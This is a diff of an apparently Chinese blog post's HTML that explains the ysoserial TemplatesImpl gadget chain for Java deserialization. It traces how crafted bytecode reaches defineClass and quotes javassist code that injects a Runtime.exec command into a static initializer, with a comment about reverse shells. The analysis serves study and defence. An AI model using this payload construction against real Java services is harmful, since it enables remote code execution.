-</code></pre></div><p>看起来有点复杂，其内容可以分为两个部分：<code>final byte[] classBytes = clazz.toBytecode();</code> 之前是用javassist辅助创建了一个类，并获取到这个类的字节码；之后的部分则是将这个字节码传入到templates中。这个 templates 来自 TemplatesImpl 类，这个类很特殊，因为其内部重写了一个叫 defineClass 的方法，这个方法的作用是将字节码转换成一个Java类。换句话说，通过 TemplatesImpl  这个类，有可能实现加载一个新的类。</p>
+    <span style=color:#75715e>// required to make TemplatesImpl happy
+</span><span style=color:#75715e></span>    Reflections<span style=color:#f92672>.</span><span style=color:#a6e22e>setFieldValue</span><span style=color:#f92672>(</span>templates<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;_name&#34;</span><span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;Pwnr&#34;</span><span style=color:#f92672>);</span>
+    Reflections<span style=color:#f92672>.</span><span style=color:#a6e22e>setFieldValue</span><span style=color:#f92672>(</span>templates<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;_tfactory&#34;</span><span style=color:#f92672>,</span> transFactory<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>());</span>
+    <span style=color:#66d9ef>return</span> templates<span style=color:#f92672>;</span>
+<span style=color:#f92672>}</span>
+</code></pre></div><p>看起来有点复杂，其内容可以分为两个部分：<code>final byte[] classBytes = clazz.toBytecode();</code> 之前是用javassist辅助创建了一个类，并获取到这个类的字节码；之后的部分则是将这个字节码传入到templates中。这个 templates 来自 TemplatesImpl 类，这个类很特殊，因为其内部重写了一个叫 defineClass 的方法，这个方法的作用是将字节码转换成一个Java类。换句话说，通过 TemplatesImpl 这个类，有可能实现加载一个新的类。</p>
 <p>我先定位到这部分代码：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">TransletClassLoader</span> <span style="color:#66d9ef">extends</span> ClassLoader <span style="color:#f92672">{</span>
-		TransletClassLoader<span style="color:#f92672">(</span>ClassLoader parent<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-		  <span style="color:#66d9ef">super</span><span style="color:#f92672">(</span>parent<span style="color:#f92672">);</span>
-		<span style="color:#f92672">}</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>TransletClassLoader</span> <span style=color:#66d9ef>extends</span> ClassLoader <span style=color:#f92672>{</span>
+		TransletClassLoader<span style=color:#f92672>(</span>ClassLoader parent<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+		  <span style=color:#66d9ef>super</span><span style=color:#f92672>(</span>parent<span style=color:#f92672>);</span>
+		<span style=color:#f92672>}</span>
 		
-		    <span style="color:#75715e">/**
-</span><span style="color:#75715e">		     * Access to final protected superclass member from outer class.
-</span><span style="color:#75715e">		     */</span>
-		Class <span style="color:#a6e22e">defineClass</span><span style="color:#f92672">(</span><span style="color:#66d9ef">final</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> b<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-		        <span style="color:#66d9ef">return</span> defineClass<span style="color:#f92672">(</span><span style="color:#66d9ef">null</span><span style="color:#f92672">,</span> b<span style="color:#f92672">,</span> 0<span style="color:#f92672">,</span> b<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">);</span>
-		<span style="color:#f92672">}</span>
-<span style="color:#f92672">}</span>
+		    <span style=color:#75715e>/**
+</span><span style=color:#75715e>		     * Access to final protected superclass member from outer class.
+</span><span style=color:#75715e>		     */</span>
+		Class <span style=color:#a6e22e>defineClass</span><span style=color:#f92672>(</span><span style=color:#66d9ef>final</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> b<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+		        <span style=color:#66d9ef>return</span> defineClass<span style=color:#f92672>(</span><span style=color:#66d9ef>null</span><span style=color:#f92672>,</span> b<span style=color:#f92672>,</span> 0<span style=color:#f92672>,</span> b<span style=color:#f92672>.</span><span style=color:#a6e22e>length</span><span style=color:#f92672>);</span>
+		<span style=color:#f92672>}</span>
+<span style=color:#f92672>}</span>
 </code></pre></div><p>这里就会发现一个问题，这个方法属于TransletClassLoader ，而这个类是一个内部类，没办法直接实例化。所以就要想方法实例化这个类，通过追溯调用链，最终可以找到一个public方法可以间接调用defineClass，而这个方法就是newTransformer，其调用链为： TemplatesImpl#newTransformer() →TemplatesImpl#getTransletInstance() → TemplatesImpl#defineTransletClasses()
 → TransletClassLoader#defineClass()。</p>
 <p>所以只要能够调用到这个方法，就有可能加载字节码；但其实这个链不仅能加载一个类，还可以同时实例化一个类的对象，而这也就是为什么要将InvokerTransformer的方法设置为newTransformer的原因。不过还有一个问题，如何设置参数为我们想要加载的字节码？这就得看看这个调用链是怎么运作的了：</p>
 <p>在newTransformer方法中，会调用一个TransformerImpl方法：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">transformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformerImpl<span style="color:#f92672">(</span>getTransletInstance<span style="color:#f92672">(),</span>_outputProperties<span style="color:#f92672">,</span>
-_indentNumber<span style="color:#f92672">,</span>_tfactory<span style="color:#f92672">);</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>transformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TransformerImpl<span style=color:#f92672>(</span>getTransletInstance<span style=color:#f92672>(),</span>_outputProperties<span style=color:#f92672>,</span>
+_indentNumber<span style=color:#f92672>,</span>_tfactory<span style=color:#f92672>);</span>
 </code></pre></div><p>这里直接调用了getTransletInstance方法，那么就看看这个方法：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">private</span> Translet <span style="color:#a6e22e">getTransletInstance</span><span style="color:#f92672">()</span>
-<span style="color:#66d9ef">throws</span> TransformerConfigurationException <span style="color:#f92672">{</span>
-		<span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
-		  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>_name <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>private</span> Translet <span style=color:#a6e22e>getTransletInstance</span><span style=color:#f92672>()</span>
+<span style=color:#66d9ef>throws</span> TransformerConfigurationException <span style=color:#f92672>{</span>
+		<span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
+		  <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>_name <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
 		
-		  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>_class <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> defineTransletClasses<span style="color:#f92672">();</span>
+		  <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>_class <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> defineTransletClasses<span style=color:#f92672>();</span>
 		
-		  <span style="color:#75715e">// The translet needs to keep a reference to all its auxiliary 
-</span><span style="color:#75715e"></span>		  <span style="color:#75715e">// class to prevent the GC from collecting them
-</span><span style="color:#75715e"></span>		  AbstractTranslet translet <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>AbstractTranslet<span style="color:#f92672">)</span> _class<span style="color:#f92672">[</span>_transletIndex<span style="color:#f92672">].</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">();</span>
-		        translet<span style="color:#f92672">.</span><span style="color:#a6e22e">postInitialization</span><span style="color:#f92672">();</span>
-		  translet<span style="color:#f92672">.</span><span style="color:#a6e22e">setTemplates</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">);</span>
-		  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>_auxClasses <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-		      translet<span style="color:#f92672">.</span><span style="color:#a6e22e">setAuxiliaryClasses</span><span style="color:#f92672">(</span>_auxClasses<span style="color:#f92672">);</span>
-		  <span style="color:#f92672">}</span>
+		  <span style=color:#75715e>// The translet needs to keep a reference to all its auxiliary 
+</span><span style=color:#75715e></span>		  <span style=color:#75715e>// class to prevent the GC from collecting them
+</span><span style=color:#75715e></span>		  AbstractTranslet translet <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>AbstractTranslet<span style=color:#f92672>)</span> _class<span style=color:#f92672>[</span>_transletIndex<span style=color:#f92672>].</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>();</span>
+		        translet<span style=color:#f92672>.</span><span style=color:#a6e22e>postInitialization</span><span style=color:#f92672>();</span>
+		  translet<span style=color:#f92672>.</span><span style=color:#a6e22e>setTemplates</span><span style=color:#f92672>(</span><span style=color:#66d9ef>this</span><span style=color:#f92672>);</span>
+		  <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>_auxClasses <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+		      translet<span style=color:#f92672>.</span><span style=color:#a6e22e>setAuxiliaryClasses</span><span style=color:#f92672>(</span>_auxClasses<span style=color:#f92672>);</span>
+		  <span style=color:#f92672>}</span>
 		  
-		  <span style="color:#66d9ef">return</span> translet<span style="color:#f92672">;</span>
-		<span style="color:#f92672">}</span>
-<span style="color:#f92672">}</span>
+		  <span style=color:#66d9ef>return</span> translet<span style=color:#f92672>;</span>
+		<span style=color:#f92672>}</span>
+<span style=color:#f92672>}</span>
 </code></pre></div><p>catch的部分我删掉了，主要关注前面的逻辑。可以看到当_name不为null，且_class为null时才会执行defineTransletClasses，接下来看看这个方法，这个方法可以分成两个部分：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">		<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>_bytecodes <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-		  ErrorMsg err <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ErrorMsg<span style="color:#f92672">(</span>ErrorMsg<span style="color:#f92672">.</span><span style="color:#a6e22e">NO_TRANSLET_CLASS_ERR</span><span style="color:#f92672">);</span>
-		  <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> TransformerConfigurationException<span style="color:#f92672">(</span>err<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">());</span>
-		<span style="color:#f92672">}</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>		<span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>_bytecodes <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+		  ErrorMsg err <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg<span style=color:#f92672>(</span>ErrorMsg<span style=color:#f92672>.</span><span style=color:#a6e22e>NO_TRANSLET_CLASS_ERR</span><span style=color:#f92672>);</span>
+		  <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException<span style=color:#f92672>(</span>err<span style=color:#f92672>.</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>());</span>
+		<span style=color:#f92672>}</span>
 		
-		    TransletClassLoader loader <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>TransletClassLoader<span style="color:#f92672">)</span>
-		        AccessController<span style="color:#f92672">.</span><span style="color:#a6e22e">doPrivileged</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> PrivilegedAction<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
-		            <span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">run</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
-		                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> TransletClassLoader<span style="color:#f92672">(</span>ObjectFactory<span style="color:#f92672">.</span><span style="color:#a6e22e">findClassLoader</span><span style="color:#f92672">());</span>
-		            <span style="color:#f92672">}</span>
-		        <span style="color:#f92672">});</span>
+		    TransletClassLoader loader <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>TransletClassLoader<span style=color:#f92672>)</span>
+		        AccessController<span style=color:#f92672>.</span><span style=color:#a6e22e>doPrivileged</span><span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> PrivilegedAction<span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
+		            <span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>run</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
+		                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>new</span> TransletClassLoader<span style=color:#f92672>(</span>ObjectFactory<span style=color:#f92672>.</span><span style=color:#a6e22e>findClassLoader</span><span style=color:#f92672>());</span>
+		            <span style=color:#f92672>}</span>
+		        <span style=color:#f92672>});</span>
 </code></pre></div><p>这部分代码首先判断_bytecodes是否为null，不为null时则会初始化一个TransletClassLoader 对象loader；初始化loader对象之后则是加载字节码，也就是后半部分：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">	<span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
-	    <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> classCount <span style="color:#f92672">=</span> _bytecodes<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">;</span>
-	    _class <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[</span>classCount<span style="color:#f92672">];</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>	<span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
+	    <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>int</span> classCount <span style=color:#f92672>=</span> _bytecodes<span style=color:#f92672>.</span><span style=color:#a6e22e>length</span><span style=color:#f92672>;</span>
+	    _class <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[</span>classCount<span style=color:#f92672>];</span>
 
-	    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>classCount <span style="color:#f92672">&gt;</span> 1<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-	        _auxClasses <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Hashtable<span style="color:#f92672">();</span>
-	    <span style="color:#f92672">}</span>
+	    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>classCount <span style=color:#f92672>&gt;</span> 1<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+	        _auxClasses <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Hashtable<span style=color:#f92672>();</span>
+	    <span style=color:#f92672>}</span>
 
-	    <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> 0<span style="color:#f92672">;</span> i <span style="color:#f92672">&lt;</span> classCount<span style="color:#f92672">;</span> i<span style="color:#f92672">++)</span> <span style="color:#f92672">{</span>
-					_class<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> loader<span style="color:#f92672">.</span><span style="color:#a6e22e">defineClass</span><span style="color:#f92672">(</span>_bytecodes<span style="color:#f92672">[</span>i<span style="color:#f92672">]);</span>
-					<span style="color:#66d9ef">final</span> Class superClass <span style="color:#f92672">=</span> _class<span style="color:#f92672">[</span>i<span style="color:#f92672">].</span><span style="color:#a6e22e">getSuperclass</span><span style="color:#f92672">();</span>
+	    <span style=color:#66d9ef>for</span> <span style=color:#f92672>(</span><span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> 0<span style=color:#f92672>;</span> i <span style=color:#f92672>&lt;</span> classCount<span style=color:#f92672>;</span> i<span style=color:#f92672>++)</span> <span style=color:#f92672>{</span>
+					_class<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> loader<span style=color:#f92672>.</span><span style=color:#a6e22e>defineClass</span><span style=color:#f92672>(</span>_bytecodes<span style=color:#f92672>[</span>i<span style=color:#f92672>]);</span>
+					<span style=color:#66d9ef>final</span> Class superClass <span style=color:#f92672>=</span> _class<span style=color:#f92672>[</span>i<span style=color:#f92672>].</span><span style=color:#a6e22e>getSuperclass</span><span style=color:#f92672>();</span>
 
-					<span style="color:#75715e">// Check if this is the main class
-</span><span style="color:#75715e"></span>					<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>superClass<span style="color:#f92672">.</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">().</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span>ABSTRACT_TRANSLET<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
-					    _transletIndex <span style="color:#f92672">=</span> i<span style="color:#f92672">;</span>
-					<span style="color:#f92672">}</span>
-					<span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
-					    _auxClasses<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span>_class<span style="color:#f92672">[</span>i<span style="color:#f92672">].</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">(),</span> _class<span style="color:#f92672">[</span>i<span style="color:#f92672">]);</span>
-					<span style="color:#f92672">}</span>
-	    <span style="color:#f92672">}</span>
+					<span style=color:#75715e>// Check if this is the main class
+</span><span style=color:#75715e></span>					<span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>superClass<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>().</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>ABSTRACT_TRANSLET<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
+					    _transletIndex <span style=color:#f92672>=</span> i<span style=color:#f92672>;</span>
+					<span style=color:#f92672>}</span>
+					<span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span>
+					    _auxClasses<span style=color:#f92672>.</span><span style=color:#a6e22e>put</span><span style=color:#f92672>(</span>_class<span style=color:#f92672>[</span>i<span style=color:#f92672>].</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>(),</span> _class<span style=color:#f92672>[</span>i<span style=color:#f92672>]);</span>
+					<span style=color:#f92672>}</span>
+	    <span style=color:#f92672>}</span>
 
-	    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>_transletIndex <span style="color:#f92672">&lt;</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-		ErrorMsg err<span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ErrorMsg<span style="color:#f92672">(</span>ErrorMsg<span style="color:#f92672">.</span><span style="color:#a6e22e">NO_MAIN_TRANSLET_ERR</span><span style="color:#f92672">,</span> _name<span style="color:#f92672">);</span>
-		<span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> TransformerConfigurationException<span style="color:#f92672">(</span>err<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">());</span>
-	    <span style="color:#f92672">}</span>
-	<span style="color:#f92672">}</span>
+	    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>_transletIndex <span style=color:#f92672>&lt;</span> 0<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+		ErrorMsg err<span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg<span style=color:#f92672>(</span>ErrorMsg<span style=color:#f92672>.</span><span style=color:#a6e22e>NO_MAIN_TRANSLET_ERR</span><span style=color:#f92672>,</span> _name<span style=color:#f92672>);</span>
+		<span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException<span style=color:#f92672>(</span>err<span style=color:#f92672>.</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>());</span>
+	    <span style=color:#f92672>}</span>
+	<span style=color:#f92672>}</span>
 </code></pre></div><p>这里首先会获取_bytecodes数组大小，然后设置_class的大小，显然是要将生成的类放到这个数组中。接下来使用for循环生成类，可以看到，循环的第一句就是defineClass，也就是说会在这里将字节码转换为类，并且参数为_bytecode的元素。</p>
 <p>那现在就知道了，为了能够加载字节码，我们需要构造一个TemplatesImpl对象templates，这个templates要满足：_name不为null，_class为null，_bytecodes是想要加载的类。但是构造时就会发现TemplatesImpl的参数构造方法都是protected的，只有一个无参构造方法是public，所以不能直接构造，只能通过反射来构造了。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">Reflections<span style="color:#f92672">.</span><span style="color:#a6e22e">setFieldValue</span><span style="color:#f92672">(</span>templates<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;_bytecodes&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]{</span>
-    classBytes<span style="color:#f92672">,</span> ClassFiles<span style="color:#f92672">.</span><span style="color:#a6e22e">classAsBytes</span><span style="color:#f92672">(</span>Foo<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">)</span>
-<span style="color:#f92672">});</span>
-Reflections<span style="color:#f92672">.</span><span style="color:#a6e22e">setFieldValue</span><span style="color:#f92672">(</span>templates<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;_name&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Pwnr&#34;</span><span style="color:#f92672">);</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>Reflections<span style=color:#f92672>.</span><span style=color:#a6e22e>setFieldValue</span><span style=color:#f92672>(</span>templates<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;_bytecodes&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[][]{</span>
+    classBytes<span style=color:#f92672>,</span> ClassFiles<span style=color:#f92672>.</span><span style=color:#a6e22e>classAsBytes</span><span style=color:#f92672>(</span>Foo<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>)</span>
+<span style=color:#f92672>});</span>
+Reflections<span style=color:#f92672>.</span><span style=color:#a6e22e>setFieldValue</span><span style=color:#f92672>(</span>templates<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;_name&#34;</span><span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;Pwnr&#34;</span><span style=color:#f92672>);</span>
 </code></pre></div><p>现在加载好了类，接下来就是实例化了。这个时候返回前面看getTransletInstance，这个方法在调用完defineTransletClasses，会继续向下执行</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"> AbstractTranslet translet <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>AbstractTranslet<span style="color:#f92672">)</span> _class<span style="color:#f92672">[</span>_transletIndex<span style="color:#f92672">].</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">();</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java> AbstractTranslet translet <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>AbstractTranslet<span style=color:#f92672>)</span> _class<span style=color:#f92672>[</span>_transletIndex<span style=color:#f92672>].</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>();</span>
 </code></pre></div><p>这里的_class不就是之前存储加载的类的数组吗，所以这里就会调用一个newInstance()方法实例化一个对象。</p>
 <p>现在就算是清楚了，首先创建一个TemplatesImpl对象，然后通过反射设置好相应的值，就可以加载并实例化想要的对象了，那么接下来就是生成这个对象的字节码了。这时候就可以重新回到createTemplatesImpl方法中，这个方法的前半部分就是干的这件事。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">		ClassPool pool <span style="color:#f92672">=</span> ClassPool<span style="color:#f92672">.</span><span style="color:#a6e22e">getDefault</span><span style="color:#f92672">();</span>
-		pool<span style="color:#f92672">.</span><span style="color:#a6e22e">insertClassPath</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> ClassClassPath<span style="color:#f92672">(</span>StubTransletPayload<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">));</span>
-		pool<span style="color:#f92672">.</span><span style="color:#a6e22e">insertClassPath</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> ClassClassPath<span style="color:#f92672">(</span>abstTranslet<span style="color:#f92672">));</span>
-		<span style="color:#66d9ef">final</span> CtClass clazz <span style="color:#f92672">=</span> pool<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>StubTransletPayload<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">());</span>
-		<span style="color:#75715e">// run command in static initializer
-</span><span style="color:#75715e"></span>		<span style="color:#75715e">// TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
-</span><span style="color:#75715e"></span>		String cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;java.lang.Runtime.getRuntime().exec(\&#34;&#34;</span> <span style="color:#f92672">+</span>
-		    command<span style="color:#f92672">.</span><span style="color:#a6e22e">replaceAll</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\\\\&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;\\\\\\\\&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">replaceAll</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\&#34;&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;\\\&#34;&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">+</span>
-		    <span style="color:#e6db74">&#34;\&#34;);&#34;</span><span style="color:#f92672">;</span>
-		clazz<span style="color:#f92672">.</span><span style="color:#a6e22e">makeClassInitializer</span><span style="color:#f92672">().</span><span style="color:#a6e22e">insertAfter</span><span style="color:#f92672">(</span>cmd<span style="color:#f92672">);</span>
-		<span style="color:#75715e">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
-</span><span style="color:#75715e"></span>		clazz<span style="color:#f92672">.</span><span style="color:#a6e22e">setName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ysoserial.Pwner&#34;</span> <span style="color:#f92672">+</span> System<span style="color:#f92672">.</span><span style="color:#a6e22e">nanoTime</span><span style="color:#f92672">());</span>
-		CtClass superC <span style="color:#f92672">=</span> pool<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>abstTranslet<span style="color:#f92672">.</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">());</span>
-		clazz<span style="color:#f92672">.</span><span style="color:#a6e22e">setSuperclass</span><span style="color:#f92672">(</span>superC<span style="color:#f92672">);</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>		ClassPool pool <span style=color:#f92672>=</span> ClassPool<span style=color:#f92672>.</span><span style=color:#a6e22e>getDefault</span><span style=color:#f92672>();</span>
+		pool<span style=color:#f92672>.</span><span style=color:#a6e22e>insertClassPath</span><span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> ClassClassPath<span style=color:#f92672>(</span>StubTransletPayload<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>));</span>
+		pool<span style=color:#f92672>.</span><span style=color:#a6e22e>insertClassPath</span><span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> ClassClassPath<span style=color:#f92672>(</span>abstTranslet<span style=color:#f92672>));</span>
+		<span style=color:#66d9ef>final</span> CtClass clazz <span style=color:#f92672>=</span> pool<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>StubTransletPayload<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>());</span>
